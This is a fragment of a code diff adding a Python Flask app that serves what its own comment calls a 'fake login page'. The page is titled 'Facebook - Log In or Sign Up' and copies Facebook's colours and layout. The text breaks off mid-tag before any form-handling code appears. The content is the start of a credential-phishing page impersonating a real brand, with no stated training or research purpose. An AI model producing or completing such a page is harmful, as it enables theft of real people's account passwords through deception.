@@ -1,0 +1,28 @@
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+# HTML template for the fake login page
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+        .container { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 200px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group input { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .form-group input:focus { outline: none; border-color: #1877f2; }
+        .login-button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .login-button:hover { background-color: #166fe5; }
+        .forgot-password { text-align: center; margin-top: 10px; }
+        .forgot-password a { color: #1877f2; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img 
